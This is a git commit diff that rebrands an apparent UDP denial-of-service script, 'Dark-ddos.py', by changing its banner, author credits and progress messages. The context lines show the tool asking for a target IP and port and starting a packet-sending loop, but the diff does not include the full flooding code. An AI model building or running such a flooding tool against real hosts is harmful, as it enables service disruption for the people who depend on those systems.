794d05fff0956ee665760acfbf8bc5b14ebd6c4e
D1ARK-VA4U3 <86417041+D1ARK-VA4U3@users.noreply.github.com>
2021-06-30 12:24:52 +0600

    Update Dark-ddos.py

--- Dark-ddos.py
+++ Dark-ddos.py
@@ -18,27 +18,27 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet CKS DDos")
+os.system("figlet Dark ddos")
 print
-print "Author   : Rh@King"
-print "You Tube : https://www.youtube.com/Cyber.king.Squad"
-print "team.CKS : white-hat-Hackers"
-print "Facebook : https://www.facebook.com/cyber king squad"
+print "Author   : D1ARK-VA4U3"
+print "Twitter  : https://twitter.com/AriyanNijhum?s=09"
+print "team.BCA : white-hat-Hackers"
+print "Facebook : https://www.facebook.com/dark.vau.its.official"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet CKS Attack Starting")
-print "[                    ] 0% Cks "
+os.system("figlet Dark Attack Starting")
+print "[                    ] 0% Dark "
 time.sleep(5)
-print "[=====               ] 25% Cks"
+print "[=====               ] 25% Dark"
 time.sleep(5)
 print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
-print "[====================] 100%Attack.by.cks"
+print "[====================] 100%Attack.by.Dark"
 time.sleep(3)
 sent = 0
 while True:
